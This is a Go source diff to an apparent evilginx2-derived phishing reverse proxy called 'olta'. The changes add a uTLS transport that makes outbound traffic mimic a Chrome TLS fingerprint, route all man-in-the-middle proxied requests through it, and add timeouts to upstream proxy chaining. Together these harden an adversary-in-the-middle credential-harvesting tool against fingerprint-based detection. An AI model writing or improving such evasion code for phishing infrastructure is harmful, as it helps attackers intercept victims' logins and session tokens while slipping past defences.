@@ -43,6 +43,7 @@ import (
 	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/s4l1hs/olta/pkg/proxy/database"
+	utlstransport "github.com/s4l1hs/olta/pkg/proxy/transport/utls"
 	"golang.org/x/net/proxy"
 
 	//"github.com/s4l1hs/olta/pkg/proxy/evilginx2/vendor/golang.org/x/net/proxy"
@@ -90,6 +91,7 @@ type HttpProxy struct {
 	turnstile         bool
 	rateLimit         int
 	rateWindow        time.Duration
+	outboundTransport *utlstransport.Transport
 }
 
 // CampaignEventSink is the narrow relational boundary used by the proxy. The
@@ -110,6 +112,14 @@ type ProxySession struct {
 	Index        int
 }
 
+type proxyRoundTripper struct {
+	transport http.RoundTripper
+}
+
+func (rt proxyRoundTripper) RoundTrip(req *http.Request, _ *goproxy.ProxyCtx) (*http.Response, error) {
+	return rt.transport.RoundTrip(req)
+}
+
 // set the value of the specified key in the JSON body
 func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
 	var data map[string]interface{}
@@ -124,9 +134,24 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, campaignEvents CampaignEventSink, bl *Blacklist, developer bool, turnstile bool, rateLimit int, rateWindow time.Duration) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, campaignEvents CampaignEventSink, bl *Blacklist, developer bool, turnstile bool, rateLimit int, rateWindow time.Duration, clientProfiles ...string) (*HttpProxy, error) {
+	clientProfile := utlstransport.ChromeProfileName
+	if len(clientProfiles) > 0 {
+		clientProfile = clientProfiles[0]
+	}
+	outboundRoundTripper := utlstransport.NewUTLSTransport(clientProfile, httpReadTimeout)
+	outboundTransport, ok := outboundRoundTripper.(*utlstransport.Transport)
+	if !ok {
+		return nil, fmt.Errorf("initialize uTLS transport: unexpected transport type %T", outboundRoundTripper)
+	}
+	proxyServer := goproxy.NewProxyHttpServer()
+	// goproxy's Tr field is a concrete *http.Transport. Keep it configured as
+	// the HTTP/1.1 fallback while its request context uses the full adaptive
+	// HTTP/1.1 and HTTP/2 round tripper below.
+	proxyServer.Tr = outboundTransport.HTTP1Transport()
+
 	p := &HttpProxy{
-		Proxy:             goproxy.NewProxyHttpServer(),
+		Proxy:             proxyServer,
 		Server:            nil,
 		crt_db:            crt_db,
 		cfg:               cfg,
@@ -142,6 +167,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		turnstile:         turnstile,
 		rateLimit:         rateLimit,
 		rateWindow:        rateWindow,
+		outboundTransport: outboundTransport,
 	}
 
 	p.Server = &http.Server{
@@ -174,6 +200,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	})
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+	p.Proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+		ctx.RoundTripper = proxyRoundTripper{transport: p.outboundTransport}
+		return req, nil
+	})
 
 	// Regular expression to detect turnstile requests
 	urlPattern := regexp.MustCompile(`/validate-captcha`)
@@ -2061,24 +2091,32 @@ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port in
 		if strings.HasPrefix(ptype, "http") {
 			var dproxy *http_dialer.HttpTunnel
 			if username != "" {
-				dproxy = http_dialer.New(&u, http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
+				dproxy = http_dialer.New(&u, http_dialer.WithConnectionTimeout(httpReadTimeout), http_dialer.WithProxyAuth(http_dialer.AuthBasic(username, password)))
 			} else {
-				dproxy = http_dialer.New(&u)
+				dproxy = http_dialer.New(&u, http_dialer.WithConnectionTimeout(httpReadTimeout))
 			}
 			p.Proxy.Tr.Dial = dproxy.Dial
+			p.outboundTransport.SetDial(dproxy.Dial)
 		} else {
 			if username != "" {
 				u.User = url.UserPassword(username, password)
 			}
 
-			dproxy, err := proxy.FromURL(&u, nil)
+			dproxy, err := proxy.FromURL(&u, &net.Dialer{Timeout: httpReadTimeout, KeepAlive: 30 * time.Second})
 			if err != nil {
 				return err
 			}
 			p.Proxy.Tr.Dial = dproxy.Dial
+			if contextDialer, ok := dproxy.(proxy.ContextDialer); ok {
+				p.outboundTransport.SetDialContext(contextDialer.DialContext)
+			} else {
+				p.outboundTransport.SetDial(dproxy.Dial)
+			}
 		}
 	} else {
 		p.Proxy.Tr.Dial = nil
+		p.Proxy.Tr.CloseIdleConnections()
+		p.outboundTransport.SetDialContext(nil)
 	}
 	return nil
 }
